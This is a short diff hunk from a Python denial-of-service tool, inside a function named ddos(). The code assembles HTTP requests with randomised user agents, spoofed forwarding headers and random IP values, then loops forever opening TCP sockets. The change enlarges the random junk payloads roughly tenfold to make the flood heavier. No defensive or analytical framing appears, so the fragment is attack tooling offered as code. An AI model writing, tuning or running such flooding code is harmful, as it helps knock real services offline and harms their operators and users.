@@ -2458,9 +2458,9 @@ def ddos():
             random.randint(0, 255)) + "\r\n"
     useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
     request = post_host + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
-    data = random._urandom(1099)
-    data1 = random._urandom(1089)
-    data2 = random._urandom(1019)
+    data = random._urandom(10999)
+    data1 = random._urandom(10899)
+    data2 = random._urandom(10199)
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
